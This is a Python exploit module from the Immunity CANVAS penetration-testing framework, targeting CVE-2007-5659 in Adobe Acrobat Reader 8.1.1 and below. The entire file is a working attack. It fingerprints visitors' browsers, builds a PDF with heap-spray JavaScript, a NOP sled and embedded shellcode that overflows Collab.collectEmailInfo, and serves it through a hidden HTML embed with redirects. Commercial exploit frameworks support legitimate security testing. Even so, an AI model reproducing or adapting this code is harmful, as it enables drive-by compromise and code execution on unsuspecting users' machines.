##ImmunityHeader v1 
###############################################################################
## File       :  acrobat_js.py
## Description:  
##            :  
## Created_On :  Sun Jan  3 13:31:04 2010
## Created_By :  Justin Seitz
## Modified_On:  Sun Jan  3 13:31:10 2010
## Modified_By:  Justin Seitz
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from libs.ua_parser import user_agent_parser
from httpclientside import httpclientside

NAME='Adobe Acrobat Reader Stack Overflow (8.1.1)'
DESCRIPTION='Adobe Acrobat Reader Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='02/06/08'
DOCUMENTATION['References']='http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=657'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION["CERT Advisory"]='None'
DOCUMENTATION['VersionsAffected']='8.1.1 and Below'
DOCUMENTATION["CVE Name"] = "CVE-2007-5659"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5659"
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['DELIVERY']='HTTP'
NOTES="""
Tested on:
Windows XP Professional SP2 English UP2DATE with Adobe Acrobat Reader 8.1.1

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_js -l 10.10.11s.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['Windows',0x42424242]
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME 
        self.htmlfilename='file.html'
        #self.pdffilename='file.pdf'
        #self.pdfdirectory='Resources'
        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'temp.pdf'
        return

        
    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0
        
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0
        
        # Tested/verified on 8.1.1
        if major <= 8:
            if major == 8:
                if minor == 1 and build == 1:
                    return 100 
                if minor <= 1 and build <= 1:
                    return 90
            elif major < 8:
                return 70
            
        return 0

    def makePDF(self):
        js="""function repeat(count,what) {
   var v = "";
   while (--count >= 0) v += what;
   return v;
}
function exploit() {
var sc = unescape("SHELLCODE");
blah = repeat(128, unescape("%u9090%u9090%u9090%u9090%u9090")) + sc;
bigblock = unescape("%u9090%u9090");
headersize = 20;
wap = headersize+blah.length
while (bigblock.length<wap) bigblock+=bigblock;
fillblock = bigblock.substring(0, wap);
block = bigblock.substring(0, bigblock.length-wap);
while(block.length+wap<0x40000) block = block+block+fillblock;
mm = new Array();
for (i=0;i<200;i++) mm[i] = block + blah;
of = repeat(4096, unescape("%u0a0a%u0a0a"));
this.collabStore = Collab.collectEmailInfo({subj: "",msg: of});
}
var shaft = app.setTimeOut("exploit();",3000);
""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode))
        input=PdfFileReader(file(self.source_pdf,'rb'))
        self.setJS(input, js)
        
        page=input.getPage(0)
        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()
    
    def setJS(self, input, content):
        #create the js entry first
        input.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        input.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        input.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('0000000000000000'))
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        
        #set the js content
        jsobject=StreamObject()
        jsobject._data=content
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')]=NameObject('/JavaScript')
        jsdict[NameObject('/JS')]=jsobject.flateEncode()

    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
            h.addHeader('Content-Type','application/pdf')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        #self.filename=self.argsDict.get('filename',self.filename)
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
